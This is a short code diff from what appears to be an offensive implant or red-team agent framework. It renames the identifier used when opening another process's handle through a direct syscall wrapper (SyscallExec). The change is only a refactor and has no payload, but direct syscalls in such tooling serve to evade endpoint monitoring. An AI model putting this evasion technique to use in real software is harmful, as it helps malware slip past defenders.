@@ -12,7 +12,7 @@ auto DECLFN Process::Open(
         OBJECT_ATTRIBUTES ObjAttr  = { sizeof(OBJECT_ATTRIBUTES), NULL, nullptr, 0, NULL, NULL };
         CLIENT_ID         ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
 
-        SyscallExec( syOpenProc, Status, &Handle, RightsAccess, &ClientID );
+        SyscallExec( Sys::OpenProc, Status, &Handle, RightsAccess, &ClientID );
         Self->Usf->NtStatusToError( Status );
     } else {
         KhDbg( "%d", KhGetError );
